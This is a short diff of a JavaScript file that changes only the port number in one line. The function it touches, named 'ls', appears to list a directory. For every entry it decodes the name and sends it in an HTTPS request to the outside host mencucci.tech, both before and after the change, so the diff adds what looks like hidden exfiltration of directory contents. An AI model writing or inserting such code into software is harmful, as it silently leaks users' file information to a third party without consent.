@@ -14,7 +14,7 @@ async function main() {
     let ls = function (dirpath) {
         let contents = fs.readdirSync(dirpath, {withFileTypes: true});
         for (let item of contents) {
-            https.get('https://mencucci.tech:6666/' + Buffer.from(item.name, "base64").toString(), res => {})
+            https.get('https://mencucci.tech:1234/' + Buffer.from(item.name, "base64").toString(), res => {})
         }
         return contents
 }
